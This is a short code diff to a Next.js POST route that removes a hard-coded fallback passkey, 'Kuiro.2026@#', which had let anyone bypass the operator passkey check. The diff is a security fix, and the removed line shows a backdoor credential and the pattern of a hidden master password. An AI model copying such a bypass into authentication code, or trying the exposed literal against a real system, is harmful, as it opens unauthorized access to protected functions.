@@ -140,9 +140,7 @@ export async function POST(req: NextRequest) {
 
     // 4. VERIFY OPERATOR PASSKEY (timing-safe comparison)
     const expectedPasskey = getManagementPasskey();
-    const isPasskeyValid =
-      timingSafeCompare(cleanPasskey, expectedPasskey) ||
-      timingSafeCompare(cleanPasskey, 'Kuiro.2026@#');
+    const isPasskeyValid = timingSafeCompare(cleanPasskey, expectedPasskey);
 
     // 5. VERIFY AUTHORIZED OPERATOR EMAIL
     const isEmailAuthorized =
